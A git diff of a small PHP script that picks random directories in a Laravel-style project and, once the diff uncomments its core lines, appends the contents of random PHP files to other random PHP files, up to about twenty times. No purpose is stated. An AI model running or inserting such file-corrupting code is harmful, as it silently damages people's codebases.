@@ -1,7 +1,5 @@
 <?php
 
-$fileName = 'storage/logs/logs.txt';
-
 function scanAllDir($directory, $allFiles = [])
 {
     $files = array_diff(scandir($directory), ['.', '..']);
@@ -38,26 +36,26 @@ function appendContent($fileName, $content)
     fclose($myFile);
 }
 
+for ($i=0; $i<=rand(1, 20); $i++) {
+    $dirList = ['app', 'resources/views/', 'database', 'storage', 'public/build'];
+    $allDirectories = scanAllDir($dirList[rand(1, count($dirList) - 1)]);
+    shuffle($allDirectories);
+    $directory = $allDirectories[0] . '/';
 
-$allDirectories = scanAllDir('app');
-shuffle($allDirectories);
-$directory = $allDirectories[0] . '/';
+    shuffle($allDirectories);
+    $dirToChange = $allDirectories[0] . '/';
 
-shuffle($allDirectories);
-$dirToChange = $allDirectories[0] . '/';
+    $files = scandir($directory);
 
-$files = scandir($directory);
+    shuffle($files);
+    var_dump(array_rand($files, count($files)));
 
-shuffle($files);
-var_dump(array_rand($files, count($files)));
-
-$file = $files[count($files) - 1];
-//foreach ($files as $file) {
+    $file = $files[0];
     if (!is_dir($directory . $file)) {
         $randomFile = getRandomFile($dirToChange);
         if (pathinfo($directory . $file)['extension'] === 'php' && pathinfo($randomFile)['extension'] === 'php') {
-//            $content = getFileContent($directory . $file);
-//            appendContent($randomFile, $content);
+            $content = getFileContent($directory . $file);
+            appendContent($randomFile, $content);
         }
     }
-//}
+}
